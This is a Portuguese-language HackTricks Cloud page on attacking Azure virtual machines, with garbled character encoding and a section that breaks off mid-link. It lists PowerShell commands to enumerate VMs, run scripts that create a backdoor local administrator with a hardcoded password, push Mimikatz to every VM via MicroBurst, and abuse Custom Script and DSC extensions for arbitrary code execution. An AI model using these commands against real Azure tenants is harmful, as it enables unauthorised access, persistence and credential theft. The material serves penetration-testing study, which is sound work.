# Az - M√°quinas Virtuais

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes b√°sicas

As m√°quinas virtuais do Azure s√£o um dos v√°rios tipos de recursos de computa√ß√£o escal√°veis sob demanda que o Azure oferece. Normalmente, voc√™ escolhe uma m√°quina virtual quando precisa de mais controle sobre o ambiente de computa√ß√£o do que as outras op√ß√µes oferecem. Este artigo fornece informa√ß√µes sobre o que voc√™ deve considerar antes de criar uma m√°quina virtual, como cri√°-la e como gerenci√°-la.

## Enumera√ß√£o

```powershell
# Obter VMs leg√≠veis
Get-AzVM | fl
# Listar VMs em execu√ß√£o
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Obter interface e endere√ßo IP
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

# Obter extens√µes instaladas
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Obter nome do conector de rede da VM
Get-AzNetworkInterface -Name <name> # Obter informa√ß√µes do conector de rede (como IP)
```

## **Executar comandos em uma VM**

### **AAD Login na VM**

√â poss√≠vel permitir o acesso a usu√°rios autenticados via AzureAD. Por exemplo, ao tentar acessar uma **VM Linux**: `ssh username@azure-corp.com@1.1.1.1` (√© importante **usar o e-mail** com o azurecorp usado ao tentar fazer login), voc√™ pode receber um erro como:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Basta **seguir essas instru√ß√µes** indo para [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando o c√≥digo, use o e-mail e a senha como credenciais e voc√™ poder√° se conectar via SSH (se esse usu√°rio tiver permiss√µes suficientes para faz√™-lo: fun√ß√£o `Virtual Machine Administrator Login` ou `Virtual Machine User Login`).

### **Executar comando**

```powershell
# A permiss√£o que permite isso √© Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Outra maneira
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Conte√∫do do script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Tente executar em todas as m√°quinas
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

### **Executar Extens√£o de Script Personalizado**

As extens√µes de m√°quina virtual (VM) do Azure s√£o **pequenas aplica√ß√µes** que fornecem configura√ß√£o p√≥s-implementa√ß√£o e tarefas de automa√ß√£o em **VMs do Azure**. Por exemplo, se uma m√°quina virtual requer instala√ß√£o de software, prote√ß√£o antiv√≠rus ou a capacidade de executar um script dentro dela, voc√™ pode usar uma extens√£o VM.

Portanto, se voc√™ tiver acesso para escrev√™-lo, poder√° executar c√≥digo arbitr√°rio:

```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```

### DesiredConfigurationState

**DesiredConfigurationState (DSC)** √© semelhante ao Ansible, mas √© uma ferramenta dentro do PowerShell que permite que um host seja configurado por meio de c√≥digo. O DSC tem sua pr√≥pria extens√£o no Azure, que permite o upload de **arquivos de configura√ß√£o**. Os arquivos de configura√ß√£o do DSC [s√£o bastante exigentes em rela√ß√£o √† sintaxe](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document), no entanto, a extens√£o DSC √© muito ing√™nua e **executar√° cegamente qualquer comando** desde que siga um determinado formato, como mostrado na figura 5.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Isso pode ser feito por meio da fun√ß√£o **Az PowerShell** [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration
## Refer√™ncias

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>